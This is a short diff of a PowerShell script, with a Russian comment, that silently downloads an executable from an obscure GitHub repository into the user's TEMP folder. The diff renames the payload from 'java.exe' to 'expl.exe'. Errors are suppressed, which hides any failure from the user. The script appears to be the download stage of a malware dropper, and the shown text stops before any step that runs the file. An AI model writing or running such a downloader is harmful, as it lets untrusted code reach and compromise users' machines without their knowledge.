@@ -1,8 +1,8 @@
 $ErrorActionPreference = 'SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$url = "https://github.com/3465h/idkkkk/raw/refs/heads/main/java.exe"
-$path = Join-Path $env:TEMP "java.exe"
+$url = "https://github.com/3465h/idkkkk/raw/refs/heads/main/expl.exe"
+$path = Join-Path $env:TEMP "expl.exe"
 
 # Качаем через встроенный метод, это надежнее чем curl в пайпе
 Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing
